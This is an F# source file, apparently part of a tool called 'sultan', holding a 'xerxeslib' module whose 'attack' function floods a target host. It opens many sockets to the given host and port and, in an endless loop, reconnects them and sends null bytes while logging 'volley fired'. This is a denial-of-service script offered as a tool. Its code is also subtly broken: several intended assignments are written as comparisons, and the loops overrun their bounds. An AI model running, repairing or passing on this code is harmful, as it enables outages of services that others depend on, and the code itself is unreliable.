namespace sultan

open sultan
open sultan.printxlib

open socklib

open System
open System.IO
open System.Net
open System.Text
open System.Net.Sockets

module xerxeslib =
    let nil : string = string (char 0x00)

    let attack (host : string) (port : int) (id : int) (connections : int) =
        if port = 0 then port = 80 else true
        if connections = 0 then connections = 10 else true
        let sockets : List<Socket>= new List<Socket>()
        for x = 0 to connections do
            sockets.Add(socketutil.connect(host, port))
        let x : int = 0
        let g : int = 1
        let r : int = 0
        while true do
            for x = 0 to sockets.Length do
                sockets.[x] = socketutil.connect(host, port)
                let request : byte array = Encoding.ASCII.GetBytes (nil)
                let currentsocket : Socket = sockets.[x]
                r = currentsocket.Send(request)
                verbose ("volley [" + x.ToString() + "] fired")
            success ("round [" + id.ToString() + "] fired")
